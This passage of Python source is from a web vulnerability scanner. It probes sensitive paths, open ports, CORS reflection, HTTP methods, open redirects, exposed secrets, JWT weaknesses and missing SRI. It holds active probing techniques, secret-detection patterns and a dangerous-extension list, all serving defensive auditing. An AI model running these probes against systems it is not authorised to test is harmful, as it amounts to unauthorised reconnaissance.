            "title": "", "detail": "", "recommendation": "", "impact": "",
        }

        if error is not None:
            row.update(classification="informational", title="Could not be reached",
                       detail=f"The request failed: {error}", confidence="low")
            rows.append(row)
            continue

        redirect_chain = [h.url for h in r.history]
        initial_status = r.history[0].status_code if r.history else r.status_code
        fp = _fingerprint_response(r)
        row["evidence"] = {
            "status": r.status_code, "initial_status": initial_status,
            "final_url": r.url, "redirect_chain": redirect_chain,
            "content_type": fp["content_type"], "size": fp["size"],
            "response_time_ms": int(r.elapsed.total_seconds() * 1000),
        }

        # app_discovery paths are informational-only, regardless of status -
        # a missing /api/health or webpack chunk is never itself a finding.
        if group_id == "app_discovery":
            if r.status_code == 200:
                row.update(classification="informational", title="Endpoint reachable",
                           detail="This endpoint responded, which is expected for a discovery/health probe and "
                                  "is not itself a vulnerability.", confidence="high")
            else:
                row.update(classification="informational", title="Endpoint not detected",
                           detail=f"HTTP {r.status_code} - the endpoint was not found.", confidence="high")
            rows.append(row)
            continue

        if r.status_code == 403:
            row.update(classification="needs_review", severity="low", confidence="low",
                       title="Blocked / Access Denied",
                       detail="HTTP 403 prevented access. This indicates the server or a security layer is "
                              "blocking the request, but resource existence could not be confirmed.",
                       recommendation="Verify that the sensitive file/path does not exist on the production "
                                       "server and that this blocking rule is intentional.")
            findings.append(Finding("Sensitive Path Exposure", f"Blocked path returned 403: /{path}", "low",
                                     row["detail"], row["recommendation"], confidence="Potential",
                                     verification_state="Potential Risk"))
            rows.append(row)
            continue

        if r.status_code == 429:
            retry_after = r.headers.get("Retry-After")
            if retry_after:
                row["evidence"]["retry_after"] = retry_after
            row.update(classification="needs_review", severity="info", confidence="low",
                       title="Rate limited",
                       detail="The target rate-limited the request (HTTP 429), so this assessment could not reliably "
                              "determine whether the resource exists. This assessment does not retry a rate-limited "
                              "path.",
                       recommendation="Re-run the scan later, outside of any rate-limit window, or investigate "
                                       "manually.")
            rows.append(row)
            continue

        if r.status_code >= 500:
            row.update(classification="needs_review", severity="info", confidence="low",
                       title="Server error",
                       detail=f"The server returned HTTP {r.status_code} while this path was being tested. This "
                                "is inconclusive - the assessment could not reliably determine whether the "
                                "resource exists.",
                       recommendation="Re-run the scan later; investigate manually if the error persists.")
            rows.append(row)
            continue

        if r.status_code == 404:
            row.update(classification="passed", severity="info", confidence="high",
                       title="Not found", detail="The resource was not found (HTTP 404).")
            rows.append(row)
            continue

        # Everything else (200, redirects that resolved to a 200, etc.) needs
        # the soft-404 / content-signature evidence to decide what it means.
        if baseline is not None and _looks_like_baseline(fp, baseline):
            row.update(classification="passed", severity="info", confidence="high",
                       title="Not found (soft 404)",
                       detail="The response matched the site's own behavior for a known-nonexistent URL - this "
                              "looks like a custom not-found page, an auth redirect, or an SPA fallback, not the "
                              "requested file.")
            rows.append(row)
            continue

        matched, sig_label, fragment = _content_signature_match(path, r)
        if matched:
            sev = CONFIRMED_EXPOSURE_SEVERITY.get(path, "high")
            impact = CONFIRMED_EXPOSURE_IMPACT.get(path, DEFAULT_IMPACT)
            remediation = CONFIRMED_EXPOSURE_REMEDIATION.get(path, DEFAULT_REMEDIATION)
            row.update(classification="confirmed", severity=sev, confidence="high",
                       title="Confirmed exposure",
                       detail=f"HTTP {r.status_code} response contained content matching {sig_label}.",
                       impact=impact, recommendation=remediation)
            if fragment:
                row["secret_evidence"] = {"masked": _redact_secret(fragment), "raw": fragment}
            # Finding.detail/.title are the only fields ai_summary.py sends to
            # the third-party LLM (see its docstring) - the matched fragment
            # must never be included there, only the signature label.
            findings.append(Finding("Sensitive Path Exposure", f"Confirmed exposure: /{path}", sev,
                                     row["detail"] + " " + impact, remediation, confidence="Confirmed",
                                     verification_state="Confirmed Finding"))
        else:
            row.update(classification="needs_review", severity="medium", confidence="low",
                       title="Reachable, not confirmed",
                       detail="The assessment detected an unusual response, but there was insufficient evidence to "
                              "confirm that the requested sensitive resource exists.",
                       recommendation="Verify the resource manually or review the production server "
                                       "configuration.")
            findings.append(Finding("Sensitive Path Exposure", f"Unconfirmed reachable path: /{path}", "medium",
                                     row["detail"], row["recommendation"], confidence="Potential",
                                     verification_state="Potential Risk"))
        rows.append(row)

    # security.txt stays its own informational-only probe (not a vulnerability
    # either way), same behavior as before this rewrite, just carrying the
    # richer row shape the report template now expects.
    try:
        r = session.get(f"{base_url}/.well-known/security.txt", timeout=REQUEST_TIMEOUT)
        if r.status_code == 200 and re.search(r"^Contact:", r.text, re.M | re.I):
            rows.append({"path": "/.well-known/security.txt", "group": "security_policy",
                         "group_label": "Security Policy", "classification": "informational",
                         "severity": "info", "confidence": "high", "title": "Security contact policy found",
                         "detail": "A security.txt document was published with a Contact field.",
                         "recommendation": "", "impact": "", "secret_evidence": None,
                         "evidence": {"status": 200, "final_url": r.url, "redirect_chain": [],
                                      "content_type": (r.headers.get("Content-Type") or "").split(";")[0],
                                      "size": len(r.content or b""),
                                      "response_time_ms": int(r.elapsed.total_seconds() * 1000)}})
        else:
            rows.append({"path": "/.well-known/security.txt", "group": "security_policy",
                         "group_label": "Security Policy", "classification": "informational",
                         "severity": "info", "confidence": "high",
                         "title": "Security contact policy not found",
                         "detail": "No standard contact for responsible vulnerability disclosure was found.",
                         "recommendation": "Consider publishing /.well-known/security.txt with a contact email "
                                            "so security researchers know how to report issues.",
                         "impact": "", "secret_evidence": None,
                         "evidence": {"status": r.status_code, "final_url": r.url, "redirect_chain": [],
                                      "content_type": "", "size": 0, "response_time_ms": 0}})
            findings.append(Finding("Sensitive Path Exposure", "No security.txt published", "info",
                                     "No standard contact for responsible vulnerability disclosure.",
                                     "Publish /.well-known/security.txt with a contact email.", confidence="Informational"))
    except requests.RequestException:
        pass

    summary = {"total": len(rows)}
    for key in ("passed", "informational", "needs_review", "confirmed"):
        summary[key] = sum(1 for row in rows if row["classification"] == key)
    if summary["confirmed"]:
        overall = "critical" if any(row["severity"] == "critical" for row in rows if row["classification"] == "confirmed") else "attention"
    elif summary["needs_review"]:
        overall = "attention"
    else:
        overall = "good"
    summary["overall"] = overall

    return {"rows": rows, "summary": summary}, findings


def check_robots_sitemap(base_url, session):
    result = {}
    for name in ("robots.txt", "sitemap.xml"):
        try:
            r = session.get(f"{base_url}/{name}", timeout=REQUEST_TIMEOUT)
            result[name] = {"code": r.status_code, "excerpt": r.text[:1500] if r.ok else ""}
        except requests.RequestException as e:
            result[name] = {"code": None, "excerpt": "", "error": str(e)}
    return result, []


def check_open_ports(hostname):
    ports = [21, 22, 23, 25, 53, 110, 143, 993, 995, 1433, 3306,
             3389, 5432, 5900, 6379, 8080, 8443, 27017, 80, 443]
    expected_open = {80, 443}
    try:
        ip = socket.gethostbyname(hostname)
    except socket.gaierror as e:
        return [{"error": str(e)}], None, []

    cdn_signatures = (b"cloudflare", b"cf-ray", b"vercel", b"fastly", b"akamai", b"cloudfront")

    def probe(port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5)
        try:
            if s.connect_ex((ip, port)) != 0:
                return port, False, b""
            # A TCP handshake alone isn't proof of a real service - CDN edge
            # IPs (Cloudflare, etc.) accept connections on many standard
            # "alternate" ports network-wide and may or may not proxy them.
            # Grab whatever bytes we can, sending a plain HTTP probe if a
            # passive banner-grab gets nothing.
            s.settimeout(2.5)
            data = b""
            try:
                data = s.recv(256)
            except TimeoutError:
                pass
            if not data:
                try:
                    s.sendall(b"HEAD / HTTP/1.0\r\nHost: %s\r\n\r\n" % hostname.encode())
                    data = s.recv(256)
                except (TimeoutError, OSError):
                    pass
        finally:
            s.close()
        return port, True, data

    rows, findings = [], []
    with ThreadPoolExecutor(max_workers=len(ports)) as pool:
        for port, is_open, data in pool.map(probe, ports):
            if not is_open:
                continue
            if port in expected_open:
                rows.append({"port": port, "status": "pass", "note": ""})
                continue
            if not data:
                rows.append({"port": port, "status": "info",
                             "note": "TCP handshake only, no response within the probe window - "
                                     "inconclusive, may be CDN/edge network noise rather than a real service."})
                continue
            is_cdn = any(sig in data.lower() for sig in cdn_signatures)
            snippet = data[:120].decode("latin-1", errors="replace").replace("\r\n", " | ")
            if is_cdn:
                rows.append({"port": port, "status": "medium",
                             "note": f"Responded, but branded as your CDN/edge: {snippet}"})
                findings.append(Finding(
                    "Network", f"CDN edge answers on alternate port {port}", "medium",
                    "The response is branded as your CDN (Cloudflare/etc.), not an unbranded origin service - "
                    "likely an 'alternate ports' feature left enabled rather than a real exposed backend.",
                    "If you don't intentionally use this port, disable alternate ports in your CDN's "
                    "network/firewall settings to shrink probe-able surface.", confidence="Strong Evidence",
                    verification_state="Observed"))
            else:
                rows.append({"port": port, "status": "warn",
                             "note": f"Responded with an unbranded service banner: {snippet}"})
                findings.append(Finding(
                    "Network", f"Unbranded service responding on unexpected port {port}", "high",
                    "This does not look like your CDN/edge - it may be a real backend service exposed directly.",
                    "Firewall this port or bind the service to localhost/a private network only.", confidence="Strong Evidence",
                    verification_state="Potential Risk"))
    rows.sort(key=lambda r: r["port"])
    return rows, ip, findings


def check_cors(base_url, session):
    evil_origin = f"https://{CANARY_HOST}"
    findings = []
    data = {}
    for path in ("/", "/api", "/api/auth/session"):
        try:
            r = session.get(base_url + path, headers={"Origin": evil_origin}, timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            continue
        acao = r.headers.get("Access-Control-Allow-Origin")
        acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()
        if not acao:
            continue
        data[path] = {"acao": acao, "acac": acac}
        if acao == evil_origin and acac == "true":
            findings.append(Finding("CORS", f"{path} reflects arbitrary Origin with credentials allowed", "critical",
                                     "Any website can make authenticated cross-origin requests on a victim's behalf.",
                                     "Only allow specific trusted origins, never reflect the request Origin, when Allow-Credentials is true.", confidence="Confirmed"))
        elif acao == evil_origin:
            findings.append(Finding("CORS", f"{path} reflects arbitrary Origin", "medium",
                                     "The endpoint echoes back any Origin sent, which is unnecessary and risky.",
                                     "Restrict Access-Control-Allow-Origin to a known allowlist.", confidence="Confirmed"))
        elif acao == "*":
            data[path]["note"] = "Wildcard CORS - fine for public read-only endpoints only."
    if not data:
        data["note"] = "No CORS headers observed on tested paths."
    return data, findings


_HTTP_METHOD_REJECTION_CODES = (400, 403, 404, 405, 501)


def check_http_methods(base_url, session):
    """Probes PUT/DELETE/TRACE/CONNECT on '/' for methods the server
    doesn't cleanly reject.

    False-positive fix: a bare "status code isn't 404/405/..." test flags
    any router that answers every verb the same way (a very common,
    perfectly safe pattern - SPA fallback routes, some CDNs/edges) as a
    "Confirmed" vulnerability, when it's proven nothing about the method
    actually being honored. Two independent lines of evidence now decide
    confidence instead of trusting the raw status code:

    - A GET baseline to the same path: if the "not rejected" method's
      status code matches GET's status exactly, that's the signature of a
      method-agnostic router, not evidence the dangerous method executes -
      downgraded to informational/"Potential" rather than a vulnerability.
    - TRACE specifically: real risk (XST) requires the server to actually
      echo the request back, not merely answer 200. A canary header is
      sent and the response body is checked for it - only reflected TRACE
      stays "Confirmed"; an unreflected 200 (same method-agnostic-router
      case) is downgraded rather than reported as XST.
    - OPTIONS' own Allow header, when present, is stronger evidence than
      either of the above if it explicitly lists the method - the server
      is stating outright that it accepts it.
    """
    rows, findings = [], []
    allow_methods = set()
    try:
        r = session.request("OPTIONS", base_url + "/", timeout=REQUEST_TIMEOUT)
        allow_header = r.headers.get("Allow", "")
        rows.append({"method": "OPTIONS", "code": r.status_code, "allow": allow_header})
        allow_methods = {m.strip().upper() for m in allow_header.split(",") if m.strip()}
    except requests.RequestException:
        pass

    baseline_status = None
    try:
        baseline = session.get(base_url + "/", timeout=REQUEST_TIMEOUT)
        baseline_status = baseline.status_code
    except requests.RequestException:
        pass

    canary = f"wvscan-trace-{os.urandom(6).hex()}"
    for method in ("PUT", "DELETE", "TRACE", "CONNECT"):
        try:
            headers = {"X-Wvscan-Trace-Canary": canary} if method == "TRACE" else {}
            r = session.request(method, base_url + "/", headers=headers, timeout=REQUEST_TIMEOUT)
            rows.append({"method": method, "code": r.status_code, "allow": ""})
            if r.status_code in _HTTP_METHOD_REJECTION_CODES:
                continue

            explicitly_allowed = method in allow_methods
            trace_reflected = method == "TRACE" and canary in r.text
            looks_method_agnostic = baseline_status is not None and r.status_code == baseline_status
            title = f"{method} method not rejected ({r.status_code})"
            recommendation = f"Disable the {method} method at the web server/edge for this route."

            if explicitly_allowed or trace_reflected:
                detail = (
                    f"Server responded {r.status_code} to {method} and "
                    + ("explicitly lists it in the OPTIONS Allow header."
                       if explicitly_allowed else "echoed the probe's canary header back in the body (reflected TRACE).")
                )
                sev = "high" if method == "TRACE" else "medium"
                findings.append(Finding("HTTP methods", title, sev, detail, recommendation, confidence="Confirmed"))
            elif looks_method_agnostic:
                detail = (
                    f"Server responded {r.status_code} to {method}, identical to a plain GET to the same path - "
                    "this usually means the route answers every HTTP verb the same way (a method-agnostic router "
                    "or edge/CDN fallback), not that the method is actually honored. Not confirmed as exploitable."
                )
                findings.append(Finding("HTTP methods", title, "info", detail, recommendation, confidence="Potential"))
            else:
                detail = f"Server responded {r.status_code} instead of 405/501 for {method}; not independently confirmed as executing the method."
                findings.append(Finding("HTTP methods", title, "medium", detail, recommendation, confidence="Potential"))
        except requests.RequestException:
            pass
    return rows, findings


def check_open_redirect(base_url, session, extra_paths):
    target = f"https://{CANARY_HOST}/"
    tested_paths = ["/"] + extra_paths[:5]
    hits, findings = [], []
    for path in tested_paths:
        for param in REDIRECT_PARAMS:
            sep = "&" if "?" in path else "?"
            test_url = f"{base_url}{path}{sep}{param}={quote(target, safe='')}"
            try:
                r = session.get(test_url, timeout=REQUEST_TIMEOUT, allow_redirects=False)
            except requests.RequestException:
                continue
            loc = r.headers.get("Location", "")
            if CANARY_HOST in loc:
                hits.append({"path": path, "param": param})
                findings.append(Finding("Open redirect", f"{path} redirects off-domain via '{param}'", "high",
                                         "The app trusts a client-supplied URL for redirection - usable for phishing.",
                                         "Validate redirect targets against an allowlist of internal paths.", confidence="Confirmed",
                                         cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"))
    return hits, findings


def check_directory_listing(base_url, session):
    rows, findings = [], []
    for d in DIR_LISTING_PATHS:
        try:
            r = session.get(f"{base_url}/{d}", timeout=REQUEST_TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code == 200 and re.search(r"index of /|<title>directory listing", r.text, re.I):
            rows.append({"path": "/" + d, "status": "warn"})
            findings.append(Finding("Exposure", f"Directory listing enabled at /{d}", "medium",
                                     "Server lists directory contents instead of returning 403/404.",
                                     "Disable autoindex/directory browsing on the web server.", confidence="Confirmed"))
    return rows, findings


def check_mixed_content(base_url, home_html):
    if not home_html or not base_url.startswith("https"):
        return [], []
    hits = sorted(set(re.findall(r'(?:src|href)=["\']http://[^"\']+', home_html)))
    findings = []
    if hits:
        findings.append(Finding("Mixed content", f"{len(hits)} insecure (http://) resource reference(s) on homepage",
                                 "medium", "Loading http:// assets on an https:// page can be blocked or MITM'd.",
                                 "Change all resource URLs to https:// or protocol-relative.", confidence="Confirmed"))
    return hits[:10], findings


def check_dns_email_security(hostname):
    domain = registrable_domain(hostname)
    data = {"domain": domain}
    findings = []
    try:
        txts = ["".join(r.strings[0:1] and [s.decode() for s in r.strings]) for r in dns.resolver.resolve(domain, "TXT")]
        spf = [t for t in txts if t.startswith("v=spf1")]
        data["spf"] = spf[0] if spf else None
        if not spf:
            findings.append(Finding("DNS/Email", "No SPF record", "medium",
                                     "Without SPF, it's easier to spoof emails 'from' your domain.",
                                     "Publish a TXT record starting with v=spf1 for your domain.", confidence="Confirmed"))
    except Exception:
        data["spf"] = None
    try:
        dtxts = ["".join(s.decode() for s in r.strings) for r in dns.resolver.resolve(f"_dmarc.{domain}", "TXT")]
        dmarc = [t for t in dtxts if t.startswith("v=DMARC1")]
        data["dmarc"] = dmarc[0] if dmarc else None
        if not dmarc:
            findings.append(Finding("DNS/Email", "No DMARC record", "medium",
                                     "Without DMARC, spoofed mail claiming to be from your domain isn't policed.",
                                     "Publish a _dmarc TXT record, e.g. v=DMARC1; p=quarantine; rua=mailto:you@domain.", confidence="Confirmed"))
    except Exception:
        data["dmarc"] = None
        findings.append(Finding("DNS/Email", "No DMARC record", "medium",
                                 "Without DMARC, spoofed mail claiming to be from your domain isn't policed.",
                                 "Publish a _dmarc TXT record, e.g. v=DMARC1; p=quarantine; rua=mailto:you@domain.", confidence="Confirmed"))
    try:
        caa = list(dns.resolver.resolve(domain, "CAA"))
        data["caa"] = [str(r) for r in caa] if caa else None
    except Exception:
        data["caa"] = None
    return data, findings


def check_vulnerable_js(base_url, home_html):
    if not home_html:
        return [], []
    srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', home_html, re.I)
    rows, findings = [], []
    for src in srcs:
        m = re.search(r'/([a-zA-Z.\-]+?)[.-](\d+)\.(\d+)\.(\d+)(?:[./]|min\.js|$)', src)
        if not m:
            continue
        name = m.group(1).lower().strip("./").split("/")[-1]
        try:
            version = tuple(int(x) for x in m.groups()[1:4])
        except ValueError:
            continue
        for lib, (is_vulnerable, why) in VULN_JS_LIBS.items():
            if lib in name and is_vulnerable(version):
                rows.append({"library": lib, "version": ".".join(map(str, version)), "src": src})
                findings.append(Finding("Dependencies", f"Outdated {lib} v{'.'.join(map(str, version))} referenced",
                                         "medium", why, f"Upgrade {lib} to a current patched version.", confidence="Strong Evidence"))
    return rows, findings


def _redact_secret(value):
    if len(value) <= 12:
        return value[:2] + "…" + value[-2:]
    return value[:6] + "…" + value[-4:]


def _fetch_same_origin_js(session, base_url, page_html, max_files, max_bytes):
    """Collects up to max_files same-origin <script src> URLs referenced in
    page_html and fetches each, capped at max_bytes. Returns a list of
    (url, text) tuples. Shared by check_exposed_secrets (JS bundles that
    might contain hardcoded secrets) and check_api_js_discovery (JS that
    might reference API endpoints)."""
    origin = urlparse(base_url).netloc
    soup = BeautifulSoup(page_html, "html.parser")

    js_urls = []
    for tag in soup.find_all("script", src=True):
        abs_url = urljoin(base_url + "/", tag["src"])
        if urlparse(abs_url).netloc == origin and abs_url not in js_urls:
            js_urls.append(abs_url)
    js_urls = js_urls[:max_files]

    sources = []
    for url in js_urls:
        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT, stream=True)
            content = b""
            for chunk in r.iter_content(chunk_size=16384):
                content += chunk
                if len(content) >= max_bytes:
                    break
            r.close()
            sources.append((url, content.decode("utf-8", errors="ignore")))
        except requests.RequestException:
            continue
    return sources


def check_exposed_secrets(session, base_url, home_html):
    """Scans the homepage HTML plus up to MAX_SECRET_JS_FILES same-origin JS
    bundles for hardcoded API keys/tokens/private keys. Values are redacted
    in the report (only a few leading/trailing chars kept) so the report
    file itself doesn't become a second place the secret is exposed."""
    sources = [("homepage HTML", home_html)]
    js_sources = _fetch_same_origin_js(session, base_url, home_html,
                                        MAX_SECRET_JS_FILES, MAX_JS_BYTES_PER_FILE)
    sources.extend(js_sources)
    js_files_scanned = len(js_sources)

    rows, findings = [], []
    seen = set()
    for label, pattern, sev in SECRET_PATTERNS:
        for source_name, text in sources:
            for m in re.finditer(pattern, text):
                value = m.group(1) if m.groups() else m.group(0)
                key = (label, value)
                if key in seen:
                    continue
                seen.add(key)
                redacted = _redact_secret(value)
                rows.append({"type": label, "source": source_name, "value": redacted, "severity": sev})
                if sev != "info":
                    findings.append(Finding("Secrets", f"Possible exposed {label}", sev,
                                             f"Found in {source_name}: {redacted}",
                                             "Remove this credential from client-shipped code. If it's real, "
                                             "rotate it immediately and load secrets server-side only.", confidence="Strong Evidence"))
    return {"rows": rows, "js_files_scanned": js_files_scanned}, findings


# Matches the same JWT shape as SECRET_PATTERNS's "JWT-looking token" entry,
# kept separate so check_jwt_weakness can decode+inspect it directly rather
# than re-deriving the match from check_exposed_secrets' redacted output.
JWT_PATTERN = r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{0,}"
MAX_JWT_FINDINGS_PER_CATEGORY = 5


def _b64url_decode_json(segment):
    """Best-effort base64url-decode + JSON-parse of a JWT header/payload
    segment. Returns None on any failure (malformed padding, non-JSON,
    non-UTF8) rather than raising - a client-side string that merely looks
    like a JWT (three dot-separated base64url chunks) is common noise and
    must not abort the scan."""
    padded = segment + "=" * (-len(segment) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(padded.encode("ascii")))
    except Exception:
        return None


def check_jwt_weakness(session, base_url, home_html):
    """Passive JWT inspection only: decodes the header (and payload, for the
    `exp` claim) of any JWT-shaped token found in the homepage HTML or
    same-origin JS bundles already fetched for check_exposed_secrets. This
    never sends a modified/forged token back to the server and never
    attempts to verify or break a signature - it only reads what the site
    already ships to every visitor's browser.

    Flags: `alg: none` (a token accepted with no signature at all is a
    critical server-side bug if the server actually honors it - this check
    cannot confirm that without forging a request, so it reports the token
    shape as the finding, not a confirmed bypass), known-weak/deprecated
    algorithms, and tokens with no `exp` claim (never expire once issued)."""
    sources = [("homepage HTML", home_html)]
    sources.extend(_fetch_same_origin_js(session, base_url, home_html,
                                          MAX_SECRET_JS_FILES, MAX_JS_BYTES_PER_FILE))

    rows, findings = [], []
    seen = set()
    counts = {"alg_none": 0, "weak_alg": 0, "no_exp": 0}
    WEAK_ALGS = {"HS1", "NONE"}
    for source_name, text in sources:
        for m in re.finditer(JWT_PATTERN, text):
            token = m.group(0)
            if token in seen:
                continue
            seen.add(token)
            parts = token.split(".")
            if len(parts) < 2:
                continue
            header = _b64url_decode_json(parts[0])
            if not isinstance(header, dict):
                continue
            payload = _b64url_decode_json(parts[1]) if len(parts) > 1 else None
            alg = str(header.get("alg", "")).upper()
            row = {"source": source_name, "alg": alg or "?", "token_preview": token[:16] + "...",
                   "has_exp": bool(isinstance(payload, dict) and payload.get("exp"))}
            rows.append(row)

            if alg == "NONE":
                if counts["alg_none"] < MAX_JWT_FINDINGS_PER_CATEGORY:
                    findings.append(Finding(
                        "Auth", f"JWT with alg:none found in {source_name}", "high",
                        "A client-visible JWT declares 'alg: none', meaning it carries no signature. "
                        "If the server accepts such tokens, authentication/authorization can be bypassed "
                        "by editing the payload with no valid signature required.",
                        "Never accept 'alg: none' server-side; pin the expected algorithm(s) explicitly "
                        "when verifying rather than trusting the token's own `alg` header.", confidence="Confirmed"))
                counts["alg_none"] += 1
            elif alg in WEAK_ALGS:
                if counts["weak_alg"] < MAX_JWT_FINDINGS_PER_CATEGORY:
                    findings.append(Finding(
                        "Auth", f"JWT using weak algorithm '{alg}' found in {source_name}", "medium",
                        f"A client-visible JWT declares alg '{alg}', which is considered weak/deprecated.",
                        "Re-issue tokens with a modern algorithm (RS256/ES256/EdDSA, or HS256 with a "
                        "strong server-side-only secret).", confidence="Confirmed"))
                counts["weak_alg"] += 1
            elif not row["has_exp"] and isinstance(payload, dict):
                if counts["no_exp"] < MAX_JWT_FINDINGS_PER_CATEGORY:
                    findings.append(Finding(
                        "Auth", f"JWT with no expiry ('exp' claim) found in {source_name}", "low",
                        "A client-visible JWT has a decodable payload but no 'exp' claim, so it never "
                        "expires once issued.",
                        "Always set a short-lived 'exp' claim and use refresh tokens for longer sessions.", confidence="Confirmed",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"))
                counts["no_exp"] += 1

    return {"rows": rows}, findings


def check_sri(base_url, home_html):
    """Flags third-party <script>/<link rel=stylesheet> tags with no
    Subresource Integrity hash. If that external host is ever compromised
    (a real, recurring supply-chain attack pattern - e.g. Magecart-style JS
    skimmers on compromised CDNs), it can silently inject malicious code
    with no way for the browser - or you - to detect the tampering."""
    if not home_html:
        return [], []
    soup = BeautifulSoup(home_html, "html.parser")
    origin = urlparse(base_url).netloc
    rows, findings = [], []

    def is_third_party(url):
        netloc = urlparse(url).netloc
        return netloc and netloc != origin

    for tag in soup.find_all("script", src=True):
        abs_url = urljoin(base_url + "/", tag["src"])
        if not is_third_party(abs_url):
            continue
        has_sri = bool(tag.get("integrity"))
        rows.append({"url": abs_url, "type": "script", "has_sri": has_sri})
        if not has_sri:
            findings.append(Finding("Supply chain", "Third-party script without SRI", "medium",
                                     f"{abs_url} is loaded from an external host with no integrity= hash.",
                                     "Add an integrity (SHA-384) and crossorigin attribute, or self-host the script.", confidence="Confirmed",
                                     cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N"))

    for tag in soup.find_all("link", href=True):
        rels = [r.lower() for r in (tag.get("rel") or [])]
        if "stylesheet" not in rels:
            continue
        abs_url = urljoin(base_url + "/", tag["href"])
        if not is_third_party(abs_url):
            continue
        has_sri = bool(tag.get("integrity"))
        rows.append({"url": abs_url, "type": "stylesheet", "has_sri": has_sri})
        if not has_sri:
            findings.append(Finding("Supply chain", "Third-party stylesheet without SRI", "low",
                                     f"{abs_url} is loaded from an external host with no integrity= hash.",
                                     "Add an integrity (SHA-384) hash, or self-host the stylesheet.", confidence="Confirmed"))

    return rows, findings


# v1.3 Phase 14 net-new checks. CHECK-02 (security.txt) and CHECK-05
# (GraphQL introspection) were NOT duplicated here - both already exist
# (check_sensitive_paths' security.txt probe, check_api_schema_exposure's
# GraphQL introspection query) - see 14-SUMMARY.md. Only the three
# genuinely missing pre-production checks were added: file upload,
# privacy/PII exposure, and caching of sensitive data.

FILE_UPLOAD_DANGEROUS_EXTENSIONS = {
    ".php", ".php3", ".php4", ".php5", ".phtml", ".asp", ".aspx", ".jsp",
    ".jspx", ".exe", ".sh", ".bat", ".cmd", ".ps1", ".cgi", ".pl", ".py",
}


def check_file_upload(base_url, home_html):
    """CHECK-01. Read-only: never uploads a file to the target (explicit
    safety rule) - identifies upload functionality by looking for
    `<input type="file">` in the homepage's own already-fetched HTML (no
    new request), and reports what a security engineer should verify
    manually before trusting it, rather than attempting to prove/disprove
    those properties by actually uploading something."""
    if not home_html:
        return {"upload_forms_found": 0}, []
    soup = BeautifulSoup(home_html, "html.parser")
    file_inputs = soup.find_all("input", {"type": "file"})
    if not file_inputs:
        return {"upload_forms_found": 0}, []

    rows = []
    for inp in file_inputs:
        form = inp.find_parent("form")
        rows.append({
            "name": inp.get("name") or "(unnamed)",
            "accept": inp.get("accept") or "(none)",
            "form_action": (form.get("action") if form else None) or base_url,
            "form_method": (form.get("method") if form else "get").upper(),
        })

    findings = [Finding(
        "File Upload", f"File upload input detected ({len(rows)} field(s))", "info",
        "A file-upload form field was found on the homepage. Glassbox never uploads a file "
        "(non-destructive by design), so extension/MIME/size validation and storage isolation "
        "cannot be verified externally - only that upload functionality exists.",
        "Manually verify: server-side (not just client-side accept=) extension and MIME-type "
        "validation, a file-size limit, uploaded files stored outside the webroot or served from "
        "a separate origin/CDN with no execute permission, and randomized/non-guessable filenames.",
        confidence="Confirmed", verification_state="Discovered",
        cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
    )]
    return {"upload_forms_found": len(rows), "rows": rows}, findings


# Deliberately conservative - a generic \b\S+@\S+\.\S+\b pattern would false-
# positive on version strings, CSS, and JS boilerplate constantly. Requires
# a plausible local-part and TLD shape, same restraint SECRET_PATTERNS above
# already applies to keep noise manageable.
_EMAIL_RE = re.compile(r"\b[A-Za-z0-9._%+-]{2,64}@[A-Za-z0-9.-]{2,255}\.[A-Za-z]{2,24}\b")
# US/international-ish phone shapes: (555) 123-4567, 555-123-4567,
# +1 555 123 4567 - intentionally narrow (7-15 digits after normalization)
# to avoid matching arbitrary numeric strings (order IDs, hashes, etc.).
_PHONE_RE = re.compile(r"(?<!\w)(?:\+?\d{1,3}[\s.-]?)?\(?\d{3}\)?[\s.-]\d{3}[\s.-]\d{4}(?!\w)")
MAX_PRIVACY_HITS_PER_TYPE = 8


def check_privacy_exposure(base_url, home_html):
    """CHECK-03. Scans the already-fetched homepage HTML (no new requests)
    for publicly exposed email addresses and phone numbers - a common
    accidental privacy leak (support inboxes, personal emails left in
    comments/JS, staff phone numbers) that has nothing to do with an
    intentional public "Contact us" page, which this check does not try to
    distinguish from a leak; that judgment is left to the reader via the
    finding's `detail`, same restraint check_exposed_secrets already
    applies to its own regex hits."""
    if not home_html:
        return {"emails": [], "phones": []}, []

    text_only = BeautifulSoup(home_html, "html.parser").get_text(" ", strip=True)
    emails = sorted(set(_EMAIL_RE.findall(text_only)))[:MAX_PRIVACY_HITS_PER_TYPE]
    phones = sorted(set(_PHONE_RE.findall(text_only)))[:MAX_PRIVACY_HITS_PER_TYPE]

    findings = []
    if emails:
        findings.append(Finding(
            "Privacy", f"{len(emails)} email address(es) found in page content", "info",
            "Email addresses appear directly in the homepage's visible text/markup. This may be "
            "intentional (a support/contact address) or an accidental leak of a personal/internal "
            "address.",
            "Confirm every listed address is meant to be public; move any that aren't behind a "
            "contact form instead.", confidence="Strong Evidence",
        ))
    if phones:
        findings.append(Finding(
            "Privacy", f"{len(phones)} phone number(s) found in page content", "info",
            "Phone numbers appear directly in the homepage's visible text/markup.",
            "Confirm every listed number is meant to be public.",
            confidence="Potential",  # the phone regex has a real false-positive surface (order/ref numbers)
        ))
    return {"emails": emails, "phones": phones}, findings


CACHEABLE_SENSITIVE_PATHS = ["login", "signin", "account", "dashboard", "profile", "admin", "settings"]


def check_caching_sensitive_data(base_url, session):
    """CHECK-04. Probes a small set of common auth/account-shaped paths
    (unauthenticated GET only - never logs in, never sends credentials) and
    flags any that respond 200 with a Cache-Control that would let a shared
    cache store the response (missing entirely, or missing both
    `no-store` and `private`). This is a same-origin, read-only GET against
    paths the site itself defines - not a new attack surface, no different
    from check_sensitive_paths' existing pattern."""
    rows, findings = [], []
    for path in CACHEABLE_SENSITIVE_PATHS:
        try:
            r = session.get(f"{base_url}/{path}", timeout=REQUEST_TIMEOUT, allow_redirects=False)
